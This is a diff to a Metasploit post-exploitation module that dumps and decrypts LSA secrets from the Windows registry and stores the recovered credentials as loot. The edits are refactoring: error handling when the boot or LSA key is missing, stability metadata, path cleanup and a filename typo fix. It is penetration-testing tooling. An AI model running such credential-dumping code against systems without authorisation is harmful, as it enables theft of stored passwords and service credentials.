@@ -21,14 +21,17 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        },
         'Author' => ['Rob Bathurst <rob.bathurst[at]foundstone.com>']
       )
     )
-    register_options(
-      [
-        OptBool.new('STORE', [true, 'Store decrypted credentials in database', true]),
-      ]
-    )
+    register_options([
+      OptBool.new('STORE', [true, 'Store decrypted credentials in database', true]),
+    ])
   end
 
   # Decrypted LSA key is passed into this method
@@ -36,8 +39,8 @@ class MetasploitModule < Msf::Post
     output = "\n"
 
     # LSA Secret key location within the registry
-    root_regkey = 'HKLM\\Security\\Policy\\Secrets\\'
-    services_key = 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\'
+    root_regkey = 'HKLM\\Security\\Policy\\Secrets'
+    services_key = 'HKLM\\SYSTEM\\CurrentControlSet\\Services'
 
     secrets = registry_enumkeys(root_regkey)
 
@@ -119,27 +122,29 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    return output
+    output
   end
 
   # The sauce starts here
   def run
-    hostname = sysinfo['Computer']
-    print_status("Executing module against #{hostname}")
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
 
     print_status('Obtaining boot key...')
     bootkey = capture_boot_key
+
+    fail_with(Failure::Unknown, 'Could not retrieve boot key. Are you SYSTEM?') if bootkey.blank?
+
     vprint_status("Boot key: #{bootkey.unpack1('H*')}")
 
-    print_status('Obtaining Lsa key...')
+    print_status('Obtaining LSA key...')
     lsa_key = capture_lsa_key(bootkey)
-    if lsa_key.nil?
-      print_error('Could not retrieve LSA key. Are you SYSTEM?')
-      return
-    end
-    vprint_status("Lsa Key: #{lsa_key.unpack1('H*')}")
 
-    secrets = hostname + get_secret(lsa_key)
+    fail_with(Failure::Unknown, 'Could not retrieve LSA key. Are you SYSTEM?') if lsa_key.blank?
+
+    vprint_status("LSA Key: #{lsa_key.unpack1('H*')}")
+
+    secrets = get_secret(lsa_key)
 
     print_status('Writing to loot...')
 
@@ -147,8 +152,8 @@ class MetasploitModule < Msf::Post
       'registry.lsa.sec',
       'text/plain',
       session,
-      secrets,
-      'reg_lsa_secrts.txt',
+      "#{hostname}#{secrets}",
+      'reg_lsa_secrets.txt',
       'Registry LSA Secret Decrypted File'
     )
 
